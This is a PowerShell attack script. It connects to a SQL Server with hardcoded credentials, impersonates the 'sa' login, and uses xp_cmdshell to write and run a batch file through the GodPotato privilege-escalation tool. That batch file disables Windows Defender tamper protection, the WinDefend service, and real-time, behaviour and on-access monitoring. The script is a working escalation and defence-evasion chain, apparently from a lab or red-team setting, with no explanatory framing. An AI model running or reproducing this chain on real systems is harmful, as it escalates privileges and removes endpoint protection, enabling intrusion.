[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Server = "192.168.77.22",
    [Parameter(Mandatory=$false)]
    [string]$Username = "analyst_t1",
    [Parameter(Mandatory=$false)]
    [string]$Password = "T13r_An@lyst!",
    [Parameter(Mandatory=$false)]
    [string]$GpPath = "C:\Windows\Temp\cadre-tools\GodPotato.exe"
)
$ErrorActionPreference = "Stop"

$cmdFile = "C:\Users\Public\dd.cmd"
$cmdLines = @(
    'reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f'
    'sc stop WinDefend'
    'sc config WinDefend start= disabled'
    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f'
    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f'
    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f'
    'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f'
    'echo DEFENDER_DISABLED'
)

$connStr = "Server=$Server;Database=master;Integrated Security=false;User ID=$Username;Password=$Password;TrustServerCertificate=True;"
try {
    Add-Type -AssemblyName System.Data
    $conn = New-Object System.Data.SqlClient.SqlConnection($connStr)
    $conn.Open()
    Write-Output "SQL_OK: connected to $Server as $Username"

    function Invoke-SqlCmd($sql) {
        $c = $conn.CreateCommand()
        $c.CommandText = "EXECUTE AS LOGIN = 'sa'; $sql; REVERT"
        $c.ExecuteNonQuery() | Out-Null
    }

    function Invoke-SqlReader($sql) {
        $c = $conn.CreateCommand()
        $c.CommandText = "EXECUTE AS LOGIN = 'sa'; $sql; REVERT"
        $reader = $c.ExecuteReader()
        $out = @()
        while ($reader.Read()) {
            if ($reader.IsDBNull(0)) { continue }
            $out += $reader.GetString(0)
        }
        $reader.Close()
        return $out
    }

    Invoke-SqlCmd "EXEC master..xp_cmdshell 'del $cmdFile'"
    foreach ($line in $cmdLines) {
        Invoke-SqlCmd "EXEC master..xp_cmdshell 'echo $line >> $cmdFile'"
    }

    $out = Invoke-SqlReader "EXEC master..xp_cmdshell '$GpPath -cmd $cmdFile'"
    $out | ForEach-Object { Write-Output $_ }
    $conn.Close()
} catch {
    Write-Output "DEFENDER_DISABLE_FAIL: $($_.Exception.Message)"
    exit 1
}
